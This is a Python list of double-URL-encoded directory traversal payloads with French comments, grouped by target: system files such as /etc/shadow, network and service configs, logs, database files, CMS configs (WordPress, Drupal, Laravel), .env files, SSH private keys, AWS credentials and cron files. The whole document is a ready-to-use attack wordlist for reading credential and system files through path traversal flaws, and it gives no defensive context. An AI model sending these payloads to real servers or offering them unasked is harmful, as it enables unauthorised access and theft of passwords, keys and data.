traversals_4_encoded = [
    # ==============================
    # 1. FICHIERS SYSTÈME CRITIQUES
    # ==============================
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow",                   # Hashs mots de passe (root requis)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/group",                    # Groupes
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/hostname",                 # Nom de la machine
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/hosts",                    # Résolution locale
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/resolv.conf",              # DNS
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/os-release",               # Infos OS
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/issue",                    # Bannière login

    # ==============================
    # 2. CONFIG RÉSEAU & SERVICES
    # ==============================
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/network/interfaces",       # Interfaces réseau (Debian/Ubuntu)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/sysctl.conf",              # Paramètres kernel
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/services",                 # Liste des ports/services
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/ssh/sshd_config",          # Config SSH

    # ==============================
    # 3. LOGS SYSTÈME
    # ==============================
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/syslog",               # Debian/Ubuntu
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/messages",             # RedHat/CentOS
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/auth.log",             # Authentification
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/secure",               # Sécurité (RedHat)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/dmesg",                # Logs kernel
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/apache2/error.log",    # Logs Apache Debian/Ubuntu
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/httpd/error_log",      # Logs Apache RedHat
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/nginx/error.log",      # Logs Nginx
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/mysql/error.log",      # Logs MySQL

    # ==============================
    # 4. FICHIERS WEB
    # ==============================
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/index.html",      # Page par défaut
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/index.php",       # Page PHP
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/config.php",      # Config PHP
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/apache2/apache2.conf",     # Config Apache Debian/Ubuntu
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/httpd/conf/httpd.conf",    # Config Apache RedHat
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/nginx/nginx.conf",         # Config Nginx
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/php/7.4/apache2/php.ini",  # PHP config (Debian/Ubuntu exemple)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/php/8.1/fpm/php.ini",      # PHP config (Debian/Ubuntu récent)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/php.ini",                  # PHP config générique

    # ==============================
    # 5. BASES DE DONNÉES (SQL)
    # ==============================
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/mysql/mysql/user.MYD",       # MySQL users
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/mysql/mysql/user.frm",       # MySQL users structure
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/mysql/mysql.db",             # DB principales
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/mysql/mysql/user.ibd",       # Table user
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/mysql/ibdata1",              # Données globales MySQL
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/mysql/ib_logfile0",          # Logs InnoDB
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/mysql/ib_logfile1",          # Logs InnoDB
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/mysql/my.cnf",                   # Config MySQL (Debian/Ubuntu)
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/my.cnf",                         # Config MySQL générique
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/postgresql/data/pg_hba.conf",# Config PostgreSQL
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/postgresql/data/postgresql.conf", # Config PostgreSQL
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/postgresql/data/base",       # Bases PostgreSQL
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fdata/data/com.mysql/databases.db",   # MySQL sur Android
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/db.sqlite3",            # SQLite Django
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/database.sqlite",       # SQLite générique
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/storage/database.sqlite", # Laravel SQLite
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/db.sql",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/backup.sql",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/mongodb/mongod.lock",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/lib/redis/dump.rdb",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/sql_dump.sql",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/backup/db_backup.sql",
    
    # ==============================
    # 6. CMS POPULAIRES
    # ==============================

    # WordPress
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/wp-config.php",         # Config WordPress
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/wp-content/uploads",    # Uploads WP
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/wp-includes/version.php", # Version WP

    # Drupal
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/sites/default/settings.php",

    # Joomla
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/configuration.php",

    # Magento
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/app/etc/env.php",

    # Laravel
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/.env",                  # Config Laravel
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/storage/logs/laravel.log",

    # Django
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/settings.py",           # Django settings

    # ==============================
    # 7. FICHIERS SENSIBLES GÉNÉRIQUES
    # ==============================
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f.env",                               # Fichier d'env générique
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconfig.json",                        # Config JSON générique
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconfig.php",                         # Config PHP générique
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fsettings.py",                        # Config Django
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fdatabase.yml",                       # Rails config DB
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fcomposer.json",                      # PHP dépendances
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fpackage.json",                       # NodeJS dépendances
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f.git/config",                        # Config Git
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f.htaccess",                          # Fichier Apache
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f.htpasswd",                          # Mots de passe Apache

    # ==============================
    # 8. CRON JOBS
    # ==============================
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/crontab",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/spool/cron/root",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/spool/cron/crontabs/root",
    
    # ==============================
    # 9. OTHERS
    # ==============================
    "%252e%252e%252f.htaccess", "%252e%252e%252f%252e%252e%252f.htaccess",
    "%252e%252e%252f.htpasswd", "%252e%252e%252f%252e%252e%252f.htpasswd",
    "%252e%252e%252f.user.ini", "%252e%252e%252f%252e%252e%252f.user.ini",
    "%252e%252e%252fweb.config", "%252e%252e%252f%252e%252e%252fweb.config",
    
    # Fichiers config
    "%252e%252e%252f.env", "%252e%252e%252f%252e%252e%252f.env",
    "%252e%252e%252fconfig.php", "%252e%252e%252f%252e%252e%252fconfig.php",
    "%252e%252e%252fsettings.php", "%252e%252e%252f%252e%252e%252fsettings.php",
    "%252e%252e%252fwp-config.php", "%252e%252e%252f%252e%252e%252fwp-config.php",
    "%252e%252e%252fconfiguration.php", "%252e%252e%252f%252e%252e%252fconfiguration.php",
    "%252e%252e%252fenv.php", "%252e%252e%252f%252e%252e%252fenv.php",

    # Logs
    "%252e%252e%252ferror.log", "%252e%252e%252f%252e%252e%252ferror.log",
    "%252e%252e%252fdebug.log", "%252e%252e%252f%252e%252e%252fdebug.log",
    "%252e%252e%252flaravel.log", "%252e%252e%252f%252e%252e%252flaravel.log",

    # Backups
    "%252e%252e%252fbackup.zip", "%252e%252e%252f%252e%252e%252fbackup.zip",
    "%252e%252e%252fconfig.php.bak", "%252e%252e%252f%252e%252e%252fconfig.php.bak",
    "%252e%252e%252fwp-config.php.old", "%252e%252e%252f%252e%252e%252fwp-config.php.old",

    # Credentials
    "%252e%252e%252f.git/config", "%252e%252e%252f%252e%252e%252f.git/config",
    "%252e%252e%252f.ssh/id_rsa", "%252e%252e%252f%252e%252e%252f.ssh/id_rsa",
    "%252e%252e%252f.aws/credentials", "%252e%252e%252f%252e%252e%252f.aws/credentials",

    # CMS
    "%252e%252e%252fwp-content/debug.log", "%252e%252e%252f%252e%252e%252fwp-content/debug.log",
    "%252e%252e%252fsites/default/settings.php", "%252e%252e%252f%252e%252e%252fsites/default/settings.php",
    "%252e%252e%252fstorage/logs/laravel.log", "%252e%252e%252f%252e%252e%252fstorage/logs/laravel.log",

    # Temp
    "%252e%252e%252fdebug.php", "%252e%252e%252f%252e%252e%252fdebug.php"
    
]